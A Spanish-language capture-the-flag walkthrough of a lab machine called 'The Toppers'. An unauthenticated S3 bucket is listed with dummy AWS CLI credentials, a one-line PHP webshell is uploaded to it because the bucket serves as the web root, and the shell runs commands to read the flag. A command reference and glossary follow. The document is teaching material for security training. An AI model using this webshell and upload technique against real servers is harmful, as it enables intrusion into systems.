// 01

Vhosts y bucket

1
RESOLVER LOS VHOSTS

El escaneo de puertos solo muestra 22/tcp (ssh, sin usar) y 80/tcp (Apache/PHP). La web se llama «The Toppers» y, según su descripción, guarda sus archivos en un bucket S3. Para llegar a ese bucket hay que resolver sus dos nombres de dominio.

BASH
$ echo '10.129.227.248 thetoppers.htb s3.thetoppers.htb' | sudo tee -a /etc/hosts

// NOTA

s3.thetoppers.htb no viene de ningún escaneo: es un subdominio que hay que adivinar o fuzzear (con ffuf -H "Host: FUZZ.thetoppers.htb", por ejemplo). Aquí se da por encontrado porque la descripción de la máquina ya apunta al bucket S3.

2
COMPROBAR LOS DOS SITIOS
BASH
$ curl -s http://thetoppers.htb/ -o /dev/null -w '%{http_code}\n'
$ curl -s http://s3.thetoppers.htb/
200
{"status": "running"}

// NOTA

{"status": "running"} es la respuesta típica de un gateway S3 (MinIO u otro compatible). Confirma que s3.thetoppers.htb es el endpoint del bucket, no una web más.

3
LISTAR EL BUCKET CON LA AWS CLI

Un endpoint S3 público no exige credenciales reales: basta con que el cliente envíe algo en esos campos.

AWS CLI
$ aws configure set aws_access_key_id temp
$ aws configure set aws_secret_access_key temp
$ aws --endpoint-url http://s3.thetoppers.htb s3 ls
$ aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
2026-10-21 10:02:11 0 thetoppers.htb
PRE images/
2026-10-21 10:02:11 298 .htaccess
2026-10-21 10:02:11 4113 index.php

// BUCKET SIN AUTENTICACIÓN

Dónde: el gateway S3 en s3.thetoppers.htb acepta ListBucket y PutObject sin validar credenciales reales.
Qué permite: leer y escribir en el bucket thetoppers.htb, que contiene exactamente los mismos ficheros (index.php, .htaccess, images/) que sirve la web principal.

// 02

Webshell y RCE

4
SUBIR UN WEBSHELL PHP AL BUCKET

Si el bucket es la raíz que sirve thetoppers.htb, un fichero .php subido ahí debería ejecutarse igual que cualquier página del sitio.

WEBSHELL
$ printf '<?php system($_GET["c"]); ?>\n' > /tmp/th_shell.php
$ aws --endpoint-url http://s3.thetoppers.htb s3 cp /tmp/th_shell.php s3://thetoppers.htb/th_shell.php
$ curl -s 'http://thetoppers.htb/th_shell.php?c=id'
upload: /tmp/th_shell.php to s3://thetoppers.htb/th_shell.php
uid=33(www-data) gid=33(www-data) groups=33(www-data)

// RCE CONFIRMADA

El propio bucket entrega el código que la web ejecuta: subir un archivo equivale a desplegar código en el servidor, sin pasar por ningún formulario de subida ni validación de la aplicación.

5
LEER LA FLAG
FLAG
$ curl -s 'http://thetoppers.htb/th_shell.php?c=ls%20/var/www'
$ curl -s 'http://thetoppers.htb/th_shell.php?c=cat%20/var/www/flag.txt'
flag.txt html th_shell.php
[flag oculta]

// FLAG

[flag oculta] — leída en /var/www/flag.txt como www-data, sin necesidad de escalar: la aplicación ya corre con los permisos suficientes para leer su propio directorio. Tiempo total: ~15 minutos.

// 03

Referencia Comandos

/etc/hosts
echo '<IP> dominio1 dominio2' | sudo tee -a /etc/hosts
Resuelve manualmente los vhosts de la máquina, que no están en ningún DNS público.
aws s3 ls
aws --endpoint-url <URL> s3 ls [s3://bucket]
Lista buckets o el contenido de uno, contra un endpoint S3 propio en vez del de Amazon.
  • --endpoint-url → Apunta la CLI al gateway S3 de la máquina en lugar de AWS real.
  • configure set aws_access_key_id/aws_secret_access_key → Rellenan credenciales aunque el servidor no las valide.
aws s3 cp
aws --endpoint-url <URL> s3 cp archivo_local s3://bucket/nombre
Sube un archivo al bucket. Si el bucket es la raíz de un sitio PHP, esto equivale a subir código al servidor.
webshell PHP
<?php system($_GET["c"]); ?>
Ejecuta como comando de shell el valor del parámetro c de la URL. Mínima y suficiente para RCE no interactiva.

// 04

Glosario

Amazon S3 / API S3
Servicio de almacenamiento de objetos de AWS. Su API (ListBucket, PutObject, GetObject...) la implementan también servidores propios (MinIO y similares), compatibles con la misma CLI.
Virtual host (vhost)
Varios sitios servidos por la misma IP y diferenciados por el Host de la petición HTTP. Hay que resolverlos a mano (/etc/hosts) o fuzzearlos cuando no están en un DNS público.
Webshell
Script subido a un servidor que ejecuta comandos a petición, normalmente leyendo un parámetro de la URL. Es la forma más directa de conseguir RCE sin necesitar una conexión de salida (reverse shell).
RCE — Remote Code Execution
Ejecución de comandos arbitrarios en el servidor desde una petición remota. Aquí ocurre porque el bucket (controlado por el atacante) y el código que ejecuta la web (el mismo bucket) son la misma cosa.
www-data
Usuario con el que corren por defecto Apache/PHP en Debian y derivados. Suele tener permisos limitados, pero en esta máquina basta para leer la flag directamente.
Bucket policy
Documento que define quién puede leer o escribir en un bucket S3. Sin una política que lo restrinja, el acceso anónimo queda abierto a cualquiera que conozca el endpoint.
